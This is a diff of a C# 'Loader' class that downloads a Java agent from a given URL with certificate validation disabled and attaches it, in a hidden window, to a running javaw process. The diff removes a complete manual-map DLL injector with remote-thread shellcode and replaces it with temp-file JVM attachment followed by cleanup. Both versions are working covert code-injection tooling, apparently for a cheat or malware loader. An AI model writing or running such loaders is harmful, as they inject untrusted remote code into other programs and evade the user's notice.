@@ -3,63 +3,11 @@ using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
-using System.Text;
 
 namespace Svc
 {
     public class Loader
     {
-        const uint PROCESS_ALL_ACCESS = 0x1FFFFF;
-        const uint MEM_COMMIT = 0x1000;
-        const uint MEM_RESERVE = 0x2000;
-        const uint MEM_RELEASE = 0x8000;
-        const uint PAGE_EXECUTE_READWRITE = 0x40;
-        const uint PAGE_READWRITE = 0x04;
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr, uint size, uint type, uint protect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, uint size, out int written);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out int tid);
-
-        [DllImport("kernel32.dll")]
-        static extern uint WaitForSingleObject(IntPtr handle, uint ms);
-
-        [DllImport("kernel32.dll")]
-        static extern bool VirtualFreeEx(IntPtr proc, IntPtr addr, uint size, uint type);
-
-        [DllImport("kernel32.dll")]
-        static extern bool CloseHandle(IntPtr handle);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool ReadProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, uint size, out int read);
-
-        [DllImport("kernel32.dll")]
-        static extern bool GetExitCodeThread(IntPtr hThread, out uint code);
-
-        [DllImport("kernel32.dll")]
-        static extern bool GetExitCodeProcess(IntPtr hProcess, out uint code);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetModuleHandle(string name);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
-        static extern IntPtr GetProcAddress(IntPtr module, string name);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
-        static extern IntPtr LoadLibrary(string name);
-
-        static ushort ReadU16(byte[] b, int o) => BitConverter.ToUInt16(b, o);
-        static uint ReadU32(byte[] b, int o) => BitConverter.ToUInt32(b, o);
-        static ulong ReadU64(byte[] b, int o) => BitConverter.ToUInt64(b, o);
-        static void WriteU64(byte[] b, int o, ulong v) { BitConverter.GetBytes(v).CopyTo(b, o); }
-
         public static int Run(string baseUrl)
         {
             ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;
@@ -67,311 +15,91 @@ namespace Svc
 
             string url = baseUrl.TrimEnd(new char[]{'/'});
             Console.WriteLine("[*] downloading from " + url);
-            byte[] dll, jar;
+            byte[] jar;
             try
             {
                 using (var wc = new WebClient())
-                {
-                    dll = wc.DownloadData(url + "/loader.dll");
                     jar = wc.DownloadData(url + "/agent.jar");
-                }
             }
             catch (Exception ex) { Console.WriteLine("[!] download failed: " + ex.Message); return 1; }
 
-            return RunDirect(dll, jar);
+            return RunDirect(jar);
         }
 
-        public static int RunDirect(byte[] dll, byte[] jar)
+        public static int RunDirect(byte[] jar)
         {
-            Console.WriteLine("[+] loader.dll=" + dll.Length + " agent.jar=" + jar.Length);
-            if (dll.Length < 64 || jar.Length < 4) { Console.WriteLine("[!] files too small"); return 1; }
-            if (ReadU16(dll, 0) != 0x5A4D) { Console.WriteLine("[!] bad MZ"); return 1; }
-            int lfanew = (int)ReadU32(dll, 0x3C);
-            if (ReadU32(dll, lfanew) != 0x4550) { Console.WriteLine("[!] bad PE"); return 1; }
+            Console.WriteLine("[+] agent.jar=" + jar.Length);
+            if (jar.Length < 4) { Console.WriteLine("[!] jar too small"); return 1; }
 
-            int pid = FindJava();
+            string javaExe = FindJavaExe();
+            if (javaExe == null) { Console.WriteLine("[!] java.exe not found"); return 1; }
+            Console.WriteLine("[+] java=" + javaExe);
+
+            int pid = FindJavaw();
             if (pid == 0) { Console.WriteLine("[!] javaw not found"); return 1; }
             Console.WriteLine("[+] javaw pid=" + pid);
 
-            IntPtr proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
-            if (proc == IntPtr.Zero) { Console.WriteLine("[!] OpenProcess failed: " + Marshal.GetLastWin32Error()); return 1; }
+            string tempDir = Path.GetTempPath();
+            string tempJar = Path.Combine(tempDir, Guid.NewGuid().ToString("N").Substring(0, 12) + ".tmp");
 
-            int result = InjectManualMap(proc, dll, jar, lfanew);
-            Array.Clear(dll, 0, dll.Length);
-            Array.Clear(jar, 0, jar.Length);
+            try
+            {
+                File.WriteAllBytes(tempJar, jar);
+                Array.Clear(jar, 0, jar.Length);
+                Console.WriteLine("[+] temp=" + tempJar);
 
-            if (result != 0) CloseHandle(proc);
-            return result;
+                ProcessStartInfo psi = new ProcessStartInfo();
+                psi.FileName = javaExe;
+                psi.Arguments = "--add-modules jdk.attach -jar \"" + tempJar + "\" " + pid;
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                psi.RedirectStandardOutput = true;
+                psi.RedirectStandardError = true;
+
+                Console.WriteLine("[*] attaching...");
+                Process p = Process.Start(psi);
+                string stdout = p.StandardOutput.ReadToEnd();
+                string stderr = p.StandardError.ReadToEnd();
+                p.WaitForExit(15000);
+
+                if (stdout.Length > 0) Console.WriteLine("[out] " + stdout.Trim());
+                if (stderr.Length > 0) Console.WriteLine("[err] " + stderr.Trim());
+                Console.WriteLine("[*] exit=" + p.ExitCode);
+
+                return p.ExitCode;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] " + ex.Message);
+                return 3;
+            }
+            finally
+            {
+                try { if (File.Exists(tempJar)) File.Delete(tempJar); } catch { }
+            }
         }
 
-        static int InjectManualMap(IntPtr proc, byte[] dll, byte[] jar, int lfanew)
+        static string FindJavaExe()
         {
-            int optOff = lfanew + 24;
-            uint sizeOfImage = ReadU32(dll, optOff + 56);
-            uint sizeOfHeaders = ReadU32(dll, optOff + 60);
-            ulong preferredBase = ReadU64(dll, optOff + 24);
-            uint entryRva = ReadU32(dll, optOff + 16);
-            int numSections = ReadU16(dll, lfanew + 6);
-            int sectionOff = optOff + ReadU16(dll, lfanew + 20);
-
-            int ddOff = optOff + 112; // PE32+ data directory table start
-            uint impRva = ReadU32(dll, ddOff + 1 * 8);     // Import Directory (entry 1)
-            uint impSize = ReadU32(dll, ddOff + 1 * 8 + 4);
-            uint relRva = ReadU32(dll, ddOff + 5 * 8);     // Base Relocation (entry 5)
-            uint relSize = ReadU32(dll, ddOff + 5 * 8 + 4);
-
-            // allocate DLL image in target
-            IntPtr remoteBase = VirtualAllocEx(proc, IntPtr.Zero, sizeOfImage,
-                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            if (remoteBase == IntPtr.Zero) return 1;
-
-            // allocate jar bytes in target
-            IntPtr remoteJar = VirtualAllocEx(proc, IntPtr.Zero, (uint)jar.Length,
-                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-            if (remoteJar == IntPtr.Zero) return 1;
-            int w;
-            WriteProcessMemory(proc, remoteJar, jar, (uint)jar.Length, out w);
-
-            // allocate context struct in target (marker + jar_addr + jar_size + status)
-            byte[] ctx = new byte[32];
-            BitConverter.GetBytes((ulong)0x4D4D).CopyTo(ctx, 0);
-            BitConverter.GetBytes((ulong)remoteJar.ToInt64()).CopyTo(ctx, 8);
-            BitConverter.GetBytes((ulong)jar.Length).CopyTo(ctx, 16);
-            // ctx[24..31] = status (initially 0, DLL writes progress codes here)
-            IntPtr remoteCtx = VirtualAllocEx(proc, IntPtr.Zero, (uint)ctx.Length,
-                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-            WriteProcessMemory(proc, remoteCtx, ctx, (uint)ctx.Length, out w);
-
-            ulong actualBase = (ulong)remoteBase.ToInt64();
-            long delta = (long)(actualBase - preferredBase);
-
-            byte[] image = new byte[sizeOfImage];
-            Array.Copy(dll, 0, image, 0, (int)sizeOfHeaders);
-
-            for (int i = 0; i < numSections; i++)
+            foreach (var p in Process.GetProcesses())
             {
-                int sh = sectionOff + i * 40;
-                uint virtAddr = ReadU32(dll, sh + 12);
-                uint rawSize = ReadU32(dll, sh + 16);
-                uint rawPtr = ReadU32(dll, sh + 20);
-                if (rawSize > 0 && rawPtr + rawSize <= dll.Length)
-                    Array.Copy(dll, (int)rawPtr, image, (int)virtAddr, (int)rawSize);
-            }
-
-            // resolve imports
-            if (impRva > 0 && impSize > 0)
-            {
-                int impOff = (int)impRva;
-                while (impOff + 20 <= image.Length)
+                try
                 {
-                    uint nameRva = ReadU32(image, impOff + 12);
-                    if (nameRva == 0) break;
-
-                    string modName = ReadAscii(image, (int)nameRva);
-                    IntPtr mod = GetModuleHandle(modName);
-                    if (mod == IntPtr.Zero)
-                        mod = LoadLibraryRemote(proc, modName);
-
-                    uint oftRva = ReadU32(image, impOff);
-                    uint ftRva = ReadU32(image, impOff + 16);
-                    if (oftRva == 0) oftRva = ftRva;
-
-                    int thunk = (int)oftRva;
-                    int func = (int)ftRva;
-                    int impIdx = 0;
-
-                    while (thunk + 8 <= image.Length)
+                    string n = p.ProcessName.ToLower();
+                    if (n == "javaw" || n == "java")
                     {
-                        ulong entry = ReadU64(image, thunk);
-                        if (entry == 0) break;
-
-                        IntPtr resolved;
-                        string resolvedName = "";
-                        if ((entry & 0x8000000000000000UL) != 0)
-                        {
-                            int ordinal = (int)(entry & 0xFFFF);
-                            resolved = GetProcAddress(mod, new string((char)ordinal, 1));
-                            resolvedName = "ord#" + ordinal;
-                        }
-                        else
-                        {
-                            int hintNameOff = (int)entry + 2;
-                            string funcName = ReadAscii(image, hintNameOff);
-                            resolved = GetProcAddress(mod, funcName);
-                            resolvedName = funcName;
-                        }
-
-                        Console.WriteLine("[imp] " + impIdx + " " + resolvedName + " => 0x" + resolved.ToInt64().ToString("X"));
-                        WriteU64(image, func, (ulong)resolved.ToInt64());
-                        thunk += 8;
-                        func += 8;
-                        impIdx++;
-                    }
-
-                    impOff += 20;
-                }
-            }
-
-            // apply relocations
-            if (relRva > 0 && relSize > 0 && delta != 0)
-            {
-                int relOff = (int)relRva;
-                while (relOff + 8 <= image.Length)
-                {
-                    uint blockVa = ReadU32(image, relOff);
-                    uint blockSize = ReadU32(image, relOff + 4);
-                    if (blockVa == 0 || blockSize == 0) break;
-
-                    int count = (int)(blockSize - 8) / 2;
-                    for (int i = 0; i < count; i++)
-                    {
-                        ushort entry = ReadU16(image, relOff + 8 + i * 2);
-                        int type = entry >> 12;
-                        int offset = entry & 0xFFF;
-                        if (type == 10)
-                        {
-                            int patchOff = (int)blockVa + offset;
-                            if (patchOff + 8 <= image.Length)
-                            {
-                                ulong val = ReadU64(image, patchOff);
-                                WriteU64(image, patchOff, (ulong)((long)val + delta));
-                            }
-                        }
-                    }
-
-                    relOff += (int)blockSize;
-                }
-            }
-
-            WriteProcessMemory(proc, remoteBase, image, sizeOfImage, out w);
-            Array.Clear(image, 0, image.Length);
-
-            // trampoline: DllMain(imageBase, DLL_PROCESS_ATTACH, &ctx)
-            IntPtr entryAddr = new IntPtr((long)actualBase + entryRva);
-            byte[] trampoline = BuildTrampoline(actualBase, (ulong)entryAddr.ToInt64(),
-                (ulong)remoteCtx.ToInt64());
-
-            IntPtr remoteTramp = VirtualAllocEx(proc, IntPtr.Zero, (uint)trampoline.Length,
-                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            WriteProcessMemory(proc, remoteTramp, trampoline, (uint)trampoline.Length, out w);
-
-            int tid;
-            IntPtr thread = CreateRemoteThread(proc, IntPtr.Zero, 0, remoteTramp, IntPtr.Zero, 0, out tid);
-            if (thread == IntPtr.Zero)
-            {
-                Console.WriteLine("[!] CreateRemoteThread failed: " + Marshal.GetLastWin32Error());
-                return 1;
-            }
-
-            uint waitResult = WaitForSingleObject(thread, 10000);
-            Console.WriteLine("[*] trampoline wait=" + waitResult);
-
-            uint threadExit = 0;
-            GetExitCodeThread(thread, out threadExit);
-            Console.WriteLine("[*] thread exit=0x" + threadExit.ToString("X8"));
-            CloseHandle(thread);
-
-            uint procExit = 0;
-            GetExitCodeProcess(proc, out procExit);
-            Console.WriteLine("[*] process exit=0x" + procExit.ToString("X8"));
-            // 0x103 = STILL_ACTIVE = process alive
-            if (procExit != 0x103)
-            {
-                Console.WriteLine("[!] javaw CRASHED with code 0x" + procExit.ToString("X8"));
-                VirtualFreeEx(proc, remoteTramp, 0, MEM_RELEASE);
-                CloseHandle(proc);
-                return 2;
-            }
-
-            VirtualFreeEx(proc, remoteTramp, 0, MEM_RELEASE);
-
-            // read status from DLL — poll for up to 8 seconds
-            IntPtr statusAddr = new IntPtr(remoteCtx.ToInt64() + 24);
-            for (int poll = 0; poll < 16; poll++)
-            {
-                System.Threading.Thread.Sleep(500);
-                byte[] sb = new byte[8];
-                int r;
-                if (ReadProcessMemory(proc, statusAddr, sb, 8, out r) && r == 8)
-                {
-                    ulong st = BitConverter.ToUInt64(sb, 0);
-                    if (st != 0)
-                    {
-                        Console.WriteLine("[*] status=0x" + st.ToString("X2"));
-                        if (st >= 0xA0 || st == 0xFF) break;
+                        string full = p.MainModule.FileName;
+                        string dir = Path.GetDirectoryName(full);
+                        string javaPath = Path.Combine(dir, "java.exe");
+                        if (File.Exists(javaPath)) return javaPath;
                     }
                 }
-                else break;
+                catch { }
             }
-
-            // re-check process after polling
-            GetExitCodeProcess(proc, out procExit);
-            Console.WriteLine("[*] post-poll exit=0x" + procExit.ToString("X8"));
-
-            // deferred cleanup: free DLL image, jar bytes, context struct
-            System.Threading.ThreadPool.QueueUserWorkItem(_ =>
-            {
-                System.Threading.Thread.Sleep(15000);
-                VirtualFreeEx(proc, remoteJar, 0, MEM_RELEASE);
-                VirtualFreeEx(proc, remoteCtx, 0, MEM_RELEASE);
-                VirtualFreeEx(proc, remoteBase, 0, MEM_RELEASE);
-                CloseHandle(proc);
-            });
-
-            return 0;
+            return null;
         }
 
-        static byte[] BuildTrampoline(ulong imageBase, ulong entry, ulong ctxAddr)
-        {
-            using (var ms = new MemoryStream())
-            using (var bw = new BinaryWriter(ms))
-            {
-                // sub rsp, 0x28
-                bw.Write(new byte[] { 0x48, 0x83, 0xEC, 0x28 });
-                // mov rcx, imageBase (hinstDLL)
-                bw.Write(new byte[] { 0x48, 0xB9 }); bw.Write(imageBase);
-                // mov edx, 1 (DLL_PROCESS_ATTACH)
-                bw.Write(new byte[] { 0xBA, 0x01, 0x00, 0x00, 0x00 });
-                // mov r8, ctxAddr (lpReserved = pointer to InjectionCtx)
-                bw.Write(new byte[] { 0x49, 0xB8 }); bw.Write(ctxAddr);
-                // mov rax, entry
-                bw.Write(new byte[] { 0x48, 0xB8 }); bw.Write(entry);
-                // call rax
-                bw.Write(new byte[] { 0xFF, 0xD0 });
-                // xor eax, eax
-                bw.Write(new byte[] { 0x31, 0xC0 });
-                // add rsp, 0x28
-                bw.Write(new byte[] { 0x48, 0x83, 0xC4, 0x28 });
-                // ret
-                bw.Write((byte)0xC3);
-                return ms.ToArray();
-            }
-        }
-
-        static IntPtr LoadLibraryRemote(IntPtr proc, string name)
-        {
-            IntPtr k32 = GetModuleHandle("kernel32.dll");
-            IntPtr loadLib = GetProcAddress(k32, "LoadLibraryA");
-
-            byte[] nameBytes = Encoding.ASCII.GetBytes(name + "\0");
-            IntPtr remoteName = VirtualAllocEx(proc, IntPtr.Zero, (uint)nameBytes.Length,
-                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-            int w;
-            WriteProcessMemory(proc, remoteName, nameBytes, (uint)nameBytes.Length, out w);
-
-            int tid;
-            IntPtr thread = CreateRemoteThread(proc, IntPtr.Zero, 0, loadLib, remoteName, 0, out tid);
-            if (thread != IntPtr.Zero)
-            {
-                WaitForSingleObject(thread, 5000);
-                CloseHandle(thread);
-            }
-
-            VirtualFreeEx(proc, remoteName, 0, MEM_RELEASE);
-            return LoadLibrary(name);
-        }
-
-        static int FindJava()
+        static int FindJavaw()
         {
             foreach (var p in Process.GetProcesses())
             {
@@ -384,13 +112,6 @@ namespace Svc
                 catch { }
             }
             return 0;
-        }
-
-        static string ReadAscii(byte[] buf, int off)
-        {
-            int end = off;
-            while (end < buf.Length && buf[end] != 0) end++;
-            return Encoding.ASCII.GetString(buf, off, end - off);
         }
     }
 }
